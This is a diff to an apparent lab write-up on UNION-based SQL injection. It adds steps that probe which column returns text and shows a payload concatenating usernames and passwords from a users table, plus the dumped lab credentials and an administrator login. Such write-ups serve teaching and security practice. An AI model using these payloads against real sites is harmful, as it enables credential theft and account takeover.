@@ -21,9 +21,19 @@ I wanted to start by determining how many columns the original query returned:
 
 It gave me an error at 3, so the original query returns 2 columns.
 
-Then I crafted this payload to return all info in a single column:
+
+Next, I had to figure out which one contained text data, so I injected this:
+
+`/filter?category=NULL' UNION SELECT 'abc', NULL from users--`
+
+It gave me an error, so I changed the position:
+
+`/filter?category=NULL' UNION SELECT NULL, 'abc' from users--`
+
+Which worked, so I crafted this payload to return all info in a single column:
 
 `/filter?category=NULL' UNION SELECT NULL, username || ' ' || password from users--`
+
 
 It returned:
 
@@ -32,5 +42,6 @@ wiener po5s4emb64oaxzktcfdp
 administrator ly7rqc1xoqfwpcomhn4b
 
 carlos dvzsk4b6324r9093mz84
+
 
 I logged in as administrator with the credentials to finish the lab.
